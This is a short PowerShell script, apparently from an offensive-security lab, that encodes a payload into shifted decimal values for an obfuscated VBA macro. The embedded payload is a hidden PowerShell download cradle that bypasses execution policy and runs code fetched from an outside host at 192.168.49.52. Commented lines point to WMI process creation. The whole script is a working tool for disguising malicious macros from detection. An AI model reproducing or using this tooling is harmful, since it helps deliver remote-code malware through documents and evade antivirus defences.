#This script converts the string inside of the $payload variable into a decimal string to be used in the Obfuscated_VBAUsingCaesarCipher macro

$payload = "powershell -exec bypass -nop -w hidden -c iex((New-Object Net.Webclient).DownloadString('http://192.168.49.52:8000/run.txt'))"
#$payload = "winmgmts:"
#$payload = "Win32_Process"

[string]$output = ""

$payload.ToCharArray() | %{
    [string]$thischar = [byte][char]$_ + 17
    if($thischar.Length -eq 1) 
    {
        $thischar = [string]"00" + $thischar
        $output += $thischar
    }
    elseif($thischar.Length -eq 2) 
    {
        $thischar = [string]"0" + $thischar
        $output += $thischar
    }
    elseif($thischar.Length -eq 3) 
    {
        $output += $thischar
    }}
$output | clip
Write-Host "Encrypted:" $output

